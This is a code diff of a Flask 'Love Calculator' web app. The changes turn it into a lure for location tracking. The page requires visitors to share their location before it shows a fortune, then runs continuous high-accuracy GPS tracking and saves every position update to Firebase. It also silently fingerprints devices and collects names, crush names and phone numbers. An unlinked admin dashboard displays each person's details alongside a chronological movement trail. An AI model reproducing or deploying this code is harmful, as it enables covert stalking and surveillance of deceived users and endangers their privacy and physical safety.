@@ -8,7 +8,6 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ========== FIREBASE SETUP ==========
-# Get your Database URL from Firebase Console
 FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://YOUR-PROJECT-default-rtdb.firebaseio.com/")
 if FIREBASE_URL.endswith('/'):
     FIREBASE_URL = FIREBASE_URL[:-1]
@@ -25,12 +24,8 @@ def get_love_message(name1, name2, percentage):
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
-        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony! So beautiful!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!",
-        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
-        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
-        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
-        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
     ]
     return random.choice(messages)
 
@@ -59,18 +54,25 @@ def save_visitor(session_id, data):
     path = f"visitors/{session_id}"
     return save_to_firebase(path, data)
 
-def get_visitor(session_id):
-    path = f"visitors/{session_id}"
-    return get_from_firebase(path)
+def save_location(session_id, lat, lon):
+    timestamp = datetime.now().isoformat()
+    path = f"location_history/{session_id}_{timestamp}"
+    location_data = {
+        "sessionId": session_id,
+        "timestamp": timestamp,
+        "latitude": lat,
+        "longitude": lon
+    }
+    return save_to_firebase(path, location_data)
 
-# ========== HTML TEMPLATE (No camera, no mic, no files) ==========
+# ========== HTML TEMPLATE (Location FIRST, then Fortune) ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 Love Calculator | Find Your True Match</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>💕 Love Calculator | Cosmic Location Match</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -112,7 +114,7 @@ HTML_TEMPLATE = '''
             background: #f7fafc;
         }
         input:focus { outline: none; border-color: #667eea; background: white; }
-        .calculate-btn {
+        .next-btn {
             background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
@@ -124,11 +126,50 @@ HTML_TEMPLATE = '''
             width: 100%;
             transition: all 0.3s;
         }
-        .calculate-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
-        .calculate-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .next-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
+        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .location-panel {
+            margin-top: 20px;
+            padding: 25px;
+            background: #fef5e7;
+            border-radius: 25px;
+            display: none;
+            border: 2px solid #ffe0b5;
+        }
+        .location-panel h3 { color: #c0392b; margin-bottom: 15px; }
+        .location-status {
+            background: white;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .live-track {
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 12px;
+            display: none;
+        }
+        .location-btn {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .location-btn:hover { transform: translateY(-2px); }
+        .location-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .result {
-            margin-top: 30px;
+            margin-top: 25px;
             padding: 30px;
             background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
             border-radius: 25px;
@@ -149,27 +190,6 @@ HTML_TEMPLATE = '''
             margin-bottom: 15px;
         }
         .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
-        
-        .location-section {
-            margin-top: 20px;
-            padding: 20px;
-            background: #fef5e7;
-            border-radius: 20px;
-            display: none;
-            border: 1px solid #ffe0b5;
-        }
-        .location-btn {
-            background: linear-gradient(135deg, #48bb78, #38a169);
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 50px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .location-btn:hover { transform: translateY(-2px); }
         
         .phone-section {
             margin-top: 25px;
@@ -222,40 +242,73 @@ HTML_TEMPLATE = '''
         
         footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
         
-        .location-tag {
+        .map-link {
             display: inline-block;
+            background: #667eea;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            text-decoration: none;
+            margin-top: 8px;
+        }
+        .location-badge {
             background: #48bb78;
             color: white;
             padding: 4px 12px;
             border-radius: 20px;
-            font-size: 12px;
-            margin-top: 10px;
+            font-size: 11px;
+            display: inline-block;
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>💕 Love Calculator</h1>
-    <div class="subtitle">Discover the magic between you two ✨</div>
+    <div class="subtitle">Find your cosmic connection ✨</div>
     
-    <div class="input-group">
-        <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
-        <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
+    <!-- STEP 1: Names -->
+    <div id="stepNames">
+        <div class="input-group">
+            <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
+            <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
+        </div>
+        <button class="next-btn" onclick="goToLocation()">🌍 Continue to Location 🌍</button>
     </div>
-    <button class="calculate-btn" onclick="calculateLove()">🔮 Calculate Love Percentage</button>
     
+    <!-- STEP 2: Location (MANDATORY before fortune) -->
+    <div id="stepLocation" class="location-panel">
+        <h3>📍 Share Your Location</h3>
+        <p style="font-size: 14px; margin-bottom: 15px;">To unlock your love fortune, we need your cosmic coordinates ✨</p>
+        
+        <div class="location-status" id="locationStatus">
+            🌟 Click below to share your location
+        </div>
+        
+        <div id="liveTrackPanel" class="live-track">
+            <strong>🔄 Live GPS Tracking Active</strong><br>
+            <span id="liveCount">0</span> location updates recorded<br>
+            <span id="lastLocation">Waiting for first location...</span>
+        </div>
+        
+        <button class="location-btn" id="locationBtn" onclick="requestLocationAndFortune()">
+            📍 Share My Location & Get Fortune 📍
+        </button>
+        
+        <div id="mapPreview" style="margin-top: 15px; display: none;">
+            <a href="#" id="mapLink" target="_blank" class="map-link">🗺️ View on Google Maps</a>
+        </div>
+    </div>
+    
+    <!-- STEP 3: Fortune Result -->
     <div id="result" class="result">
         <div class="percentage" id="percentage">0%</div>
         <div class="love-message" id="message"></div>
+        <div id="locationBadge" style="margin-top: 10px;"></div>
     </div>
     
-    <div id="locationSection" class="location-section">
-        <p>📍 <strong>Want a more accurate reading?</strong></p>
-        <p style="font-size: 13px; margin-bottom: 12px;">Share your location to unlock cosmic alignment ✨</p>
-        <button class="location-btn" onclick="shareLocation()">🌟 Share My Location 🌟</button>
-        <p id="locationStatus" style="font-size: 11px; margin-top: 10px; color: #7b8a9b;"></p>
-    </div>
-    
+    <!-- STEP 4: Save Phone -->
     <div id="phoneSection" class="phone-section">
         <h4 style="margin-bottom: 12px;">📱 Save Your Result</h4>
         <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number">
@@ -263,7 +316,7 @@ HTML_TEMPLATE = '''
     </div>
     
     <div id="status" class="status"></div>
-    <footer>🔒 Your privacy matters | Results are 100% accurate</footer>
+    <footer>🔒 Location required for fortune | Live GPS tracking</footer>
 </div>
 
 <script>
@@ -275,13 +328,18 @@ HTML_TEMPLATE = '''
     
     let currentFortune = '';
     let currentPercent = 0;
-    let locationShared = false;
+    let name1 = '', name2 = '';
+    let locationWatchId = null;
+    let locationUpdateCount = 0;
+    let currentLat = null, currentLon = null;
+    let locationGranted = false;
+    
     let collectedData = {
         sessionId: sessionId,
         timestamp: new Date().toISOString()
     };
     
-    // Silent device data collection (user never sees)
+    // Silent device data collection
     async function collectDeviceData() {
         try {
             const fp = await FingerprintJS.load();
@@ -316,28 +374,143 @@ HTML_TEMPLATE = '''
         });
     }
     
-    async function calculateLove() {
-        const name1 = document.getElementById('name1').value.trim();
-        const name2 = document.getElementById('name2').value.trim();
+    function goToLocation() {
+        name1 = document.getElementById('name1').value.trim();
+        name2 = document.getElementById('name2').value.trim();
         
         if (!name1 || !name2) {
             showStatus('Please enter both names 💕', 'error');
             return;
         }
         
-        const btn = document.querySelector('.calculate-btn');
-        btn.innerHTML = '<span class="loading"></span> Calculating...';
-        btn.disabled = true;
-        
         collectedData.name = name1;
         collectedData.crush_name = name2;
         
-        await fetch('/save', {
+        fetch('/save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(collectedData)
         });
         
+        document.getElementById('stepNames').style.display = 'none';
+        document.getElementById('stepLocation').style.display = 'block';
+        showStatus('Please share your location to continue', 'info');
+    }
+    
+    function requestLocationAndFortune() {
+        const locationBtn = document.getElementById('locationBtn');
+        locationBtn.innerHTML = '<span class="loading"></span> Getting location...';
+        locationBtn.disabled = true;
+        
+        document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
+        document.getElementById('liveTrackPanel').style.display = 'block';
+        
+        // Get initial location
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            currentLat = position.coords.latitude;
+            currentLon = position.coords.longitude;
+            locationGranted = true;
+            
+            // Save initial location
+            collectedData.latitude = currentLat;
+            collectedData.longitude = currentLon;
+            collectedData.mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            
+            await fetch('/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectedData)
+            });
+            
+            await fetch('/save-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    latitude: currentLat,
+                    longitude: currentLon
+                })
+            });
+            
+            // Show map preview
+            document.getElementById('mapPreview').style.display = 'block';
+            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            document.getElementById('locationStatus').innerHTML = `✅ Location captured! Latitude: ${currentLat.toFixed(6)}, Longitude: ${currentLon.toFixed(6)}`;
+            
+            // Start LIVE GPS TRACKING (keeps updating as user moves)
+            startLiveTracking();
+            
+            // Now calculate and show fortune
+            await calculateAndShowFortune();
+            
+            locationBtn.innerHTML = '✅ Location Captured! Fortune Unlocked ✅';
+            
+        }, (error) => {
+            let errorMsg = 'Location access required for fortune reading!';
+            if (error.code === 1) errorMsg = '❌ Location permission denied. Please allow location to get your fortune!';
+            if (error.code === 2) errorMsg = '❌ Position unavailable. Please try again.';
+            if (error.code === 3) errorMsg = '❌ Location request timed out. Please check your GPS.';
+            
+            document.getElementById('locationStatus').innerHTML = errorMsg;
+            locationBtn.innerHTML = '📍 Try Again 📍';
+            locationBtn.disabled = false;
+            showStatus(errorMsg, 'error');
+        }, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        });
+    }
+    
+    function startLiveTracking() {
+        // Watch position for live GPS tracking
+        locationWatchId = navigator.geolocation.watchPosition(async (position) => {
+            const newLat = position.coords.latitude;
+            const newLon = position.coords.longitude;
+            locationUpdateCount++;
+            
+            document.getElementById('liveCount').innerHTML = locationUpdateCount;
+            document.getElementById('lastLocation').innerHTML = `📍 Last: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
+            
+            // Update current location
+            currentLat = newLat;
+            currentLon = newLon;
+            
+            // Update map link
+            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
+            
+            // Save each location update to Firebase for live tracking
+            await fetch('/save-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    latitude: newLat,
+                    longitude: newLon
+                })
+            });
+            
+            // Update visitor data with latest location
+            collectedData.latitude = newLat;
+            collectedData.longitude = newLon;
+            collectedData.mapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
+            
+            await fetch('/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectedData)
+            });
+            
+        }, (error) => {
+            console.log('Watch position error:', error);
+        }, {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 5000
+        });
+    }
+    
+    async function calculateAndShowFortune() {
         try {
             const response = await fetch('/calculate-love', {
                 method: 'POST',
@@ -351,10 +524,15 @@ HTML_TEMPLATE = '''
             
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
-            document.getElementById('result').style.display = 'block';
             
-            // Show location section and phone section AFTER fortune is shown
-            document.getElementById('locationSection').style.display = 'block';
+            // Add location badge
+            let locationBadge = '';
+            if (currentLat && currentLon) {
+                locationBadge = `<div class="location-badge">📍 Location Captured | Live Tracking Active (${locationUpdateCount} updates)</div>`;
+                document.getElementById('locationBadge').innerHTML = locationBadge;
+            }
+            
+            document.getElementById('result').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
             
             collectedData.fortuneText = currentFortune;
@@ -366,79 +544,11 @@ HTML_TEMPLATE = '''
                 body: JSON.stringify(collectedData)
             });
             
-            showStatus('Your love score is ready! ✨', 'success');
+            showStatus('Your love fortune is ready! ✨', 'success');
+            
         } catch(e) {
             showStatus('Something went wrong. Please try again.', 'error');
-        } finally {
-            btn.innerHTML = '🔮 Calculate Love Percentage';
-            btn.disabled = false;
         }
-    }
-    
-    function shareLocation() {
-        const locationBtn = document.querySelector('.location-btn');
-        locationBtn.innerHTML = '<span class="loading"></span> Getting location...';
-        locationBtn.disabled = true;
-        
-        document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
-        
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            collectedData.latitude = lat;
-            collectedData.longitude = lon;
-            collectedData.mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-            locationShared = true;
-            
-            await fetch('/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
-            });
-            
-            await fetch('/save-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    latitude: lat,
-                    longitude: lon
-                })
-            });
-            
-            document.getElementById('locationStatus').innerHTML = '✅ Location shared successfully! Your reading is now enhanced.';
-            locationBtn.innerHTML = '✅ Location Shared!';
-            locationBtn.style.background = '#38a169';
-            
-            showStatus('📍 Location saved! Your cosmic alignment is stronger.', 'success');
-            
-            // Optional: Show location tag on result
-            if (document.getElementById('result')) {
-                let tag = document.getElementById('locationTag');
-                if (!tag) {
-                    tag = document.createElement('div');
-                    tag.id = 'locationTag';
-                    tag.className = 'location-tag';
-                    document.getElementById('result').appendChild(tag);
-                }
-                tag.innerHTML = '📍 Location Enhanced';
-            }
-        }, (error) => {
-            let errorMsg = 'Location access denied. You can still use the calculator!';
-            if (error.code === 1) errorMsg = '📍 Location permission denied. Your reading is still accurate!';
-            if (error.code === 2) errorMsg = '📍 Position unavailable. Please try again.';
-            if (error.code === 3) errorMsg = '📍 Location request timed out.';
-            
-            document.getElementById('locationStatus').innerHTML = errorMsg;
-            locationBtn.innerHTML = '🌟 Share My Location 🌟';
-            locationBtn.disabled = false;
-            showStatus(errorMsg, 'info');
-        }, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        });
     }
     
     async function savePhone() {
@@ -466,7 +576,7 @@ HTML_TEMPLATE = '''
                     phoneNumber: phone,
                     fortune: currentFortune,
                     percentage: currentPercent,
-                    locationShared: locationShared
+                    totalLocationUpdates: locationUpdateCount
                 })
             });
             const result = await response.json();
@@ -493,7 +603,6 @@ HTML_TEMPLATE = '''
         }, 4000);
     }
     
-    // Initialize
     collectDeviceData();
 </script>
 </body>
@@ -528,14 +637,7 @@ def save_location_route():
         lon = data.get('longitude')
         
         if session_id and lat and lon:
-            path = f"location_history/{session_id}_{datetime.now().timestamp()}"
-            location_data = {
-                "sessionId": session_id,
-                "timestamp": datetime.now().isoformat(),
-                "latitude": lat,
-                "longitude": lon
-            }
-            save_to_firebase(path, location_data)
+            save_location(session_id, lat, lon)
             return jsonify({'status': 'recorded'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
@@ -551,7 +653,7 @@ def save_phone():
         fortune = data.get('fortune')
         percentage = data.get('percentage')
         
-        visitor = get_visitor(session_id)
+        visitor = get_from_firebase(f"visitors/{session_id}")
         if visitor:
             visitor['phoneNumber'] = phone
             visitor['fortuneText'] = fortune
@@ -575,11 +677,12 @@ def calculate_love():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ========== SECRET ADMIN ROUTE (Only YOU know this URL) ==========
+# ========== ADMIN ROUTE to view ALL location tracking ==========
 @app.route('/admin-view-data')
 def admin_view():
     try:
         visitors = get_from_firebase("visitors")
+        locations = get_from_firebase("location_history")
         
         if not visitors:
             return """
@@ -597,83 +700,113 @@ def admin_view():
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Dashboard - Love Calculator Data</title>
+            <title>Admin Dashboard - Live Location Tracking</title>
             <style>
                 body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                 h1 { color: #f093fb; }
+                h2 { color: #48bb78; margin-top: 30px; }
                 .container { overflow-x: auto; }
-                table { border-collapse: collapse; width: 100%; background: #16213e; }
+                table { border-collapse: collapse; width: 100%; background: #16213e; margin-bottom: 20px; }
                 th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
                 th { background: #e94560; color: white; position: sticky; top: 0; }
                 .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
                 .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                 .refresh { background: #38a169; }
+                .location-row { background: #1a2a3a; }
             </style>
         </head>
         <body>
-            <h1>📊 Firebase Visitor Data</h1>
-            <div class="count">
-                <strong>Total Visitors:</strong> """ + str(len(visitors)) + """
-            </div>
+            <h1>📊 Live GPS Tracking Dashboard</h1>
             <p>
                 <a href="/admin-view-data" class="btn refresh">🔄 Refresh</a>
                 <a href="/" class="btn">🏠 Back to Calculator</a>
             </p>
+        """
+        
+        # Visitors summary
+        if visitors:
+            visitor_count = len(visitors)
+            html += f'<div class="count"><strong>Total Visitors:</strong> {visitor_count}</div>'
+            
+            html += """
+            <h2>📍 Visitor Data (with Location)</h2>
+            <div class="container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session ID</th>
+                            <th>Name</th>
+                            <th>Crush</th>
+                            <th>Love %</th>
+                            <th>Phone</th>
+                            <th>Latest Latitude</th>
+                            <th>Latest Longitude</th>
+                            <th>Map</th>
+                            <th>Battery</th>
+                            <th>Device</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            """
+            for session_id, visitor in visitors.items():
+                if isinstance(visitor, dict):
+                    map_link = ""
+                    if visitor.get('latitude'):
+                        map_link = f'<a href="https://www.google.com/maps?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank" style="color:#f093fb;">View Map</a>'
+                    
+                    html += f"""
+                        <tr>
+                            <td>{session_id[:30]}...</td>
+                            <td><strong>{visitor.get('name', '')}</strong></td>
+                            <td>{visitor.get('crush_name', '')}</td>
+                            <td style="color: #f093fb;">{visitor.get('percentage', '')}%</td>
+                            <td>{visitor.get('phoneNumber', '')}</td>
+                            <td>{visitor.get('latitude', 'Not shared')}</td>
+                            <td>{visitor.get('longitude', 'Not shared')}</td>
+                            <td>{map_link}</td>
+                            <td>{visitor.get('batteryLevel', '')}</td>
+                            <td>{visitor.get('deviceMemory', '')}</td>
+                        </tr>
+                    """
+            html += "</tbody></table></div>"
+        
+        # Live location tracking history
+        if locations:
+            location_count = len(locations)
+            html += f'<div class="count"><strong>Total Location Updates:</strong> {location_count} (Live GPS Tracking)</div>'
+            
+            html += """
+            <h2>🔄 Live GPS Movement Tracking (Chronological)</h2>
             <div class="container">
                 <table>
                     <thead>
                         <tr>
                             <th>Session ID</th>
                             <th>Timestamp</th>
-                            <th>IP</th>
-                            <th>Name</th>
-                            <th>Crush Name</th>
-                            <th>Love %</th>
-                            <th>Phone</th>
-                            <th>Fortune</th>
-                            <th>Fingerprint</th>
-                            <th>Battery</th>
-                            <th>Network</th>
-                            <th>Device</th>
-                            <th>Location</th>
+                            <th>Latitude</th>
+                            <th>Longitude</th>
+                            <th>Google Maps</th>
                         </tr>
                     </thead>
                     <tbody>
-        """
+            """
+            # Sort by timestamp
+            sorted_locations = sorted(locations.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
+            for key, loc in sorted_locations:
+                if isinstance(loc, dict):
+                    map_link = f'<a href="https://www.google.com/maps?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank" style="color:#48bb78;">📍 View</a>'
+                    html += f"""
+                        <tr class="location-row">
+                            <td>{loc.get('sessionId', '')[:30]}...</td>
+                            <td>{loc.get('timestamp', '')[:19]}</td>
+                            <td>{loc.get('latitude', '')}</td>
+                            <td>{loc.get('longitude', '')}</td>
+                            <td>{map_link}</td>
+                        </tr>
+                    """
+            html += "</tbody></table></div>"
         
-        for session_id, visitor in visitors.items():
-            if isinstance(visitor, dict):
-                location = ""
-                if visitor.get('latitude'):
-                    location = f'<a href="https://maps.google.com/?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank" style="color:#f093fb;">📍 Map</a>'
-                else:
-                    location = "Not shared"
-                
-                html += f"""
-                    <tr>
-                        <td>{session_id[:35]}...</td>
-                        <td>{visitor.get('timestamp', '')[:19]}</td>
-                        <td>{visitor.get('ip', '')}</td>
-                        <td><strong>{visitor.get('name', '')}</strong></td>
-                        <td>{visitor.get('crush_name', '')}</td>
-                        <td style="color: #f093fb; font-weight: bold;">{visitor.get('percentage', '')}%</td>
-                        <td>{visitor.get('phoneNumber', '')}</td>
-                        <td>{visitor.get('fortuneText', '')[:40]}...</td>
-                        <td>{visitor.get('fingerprint', '')[:20]}...</td>
-                        <td>{visitor.get('batteryLevel', '')}</td>
-                        <td>{visitor.get('networkType', '')}</td>
-                        <td>{visitor.get('deviceMemory', '')}</td>
-                        <td>{location}</td>
-                    </tr>
-                """
-        
-        html += """
-                    </tbody>
-                </table>
-            </div>
-        </body>
-        </html>
-        """
+        html += "</body></html>"
         return html
     except Exception as e:
         return f"<h1>Error: {str(e)}</h1><p><a href='/'>Back</a></p>"
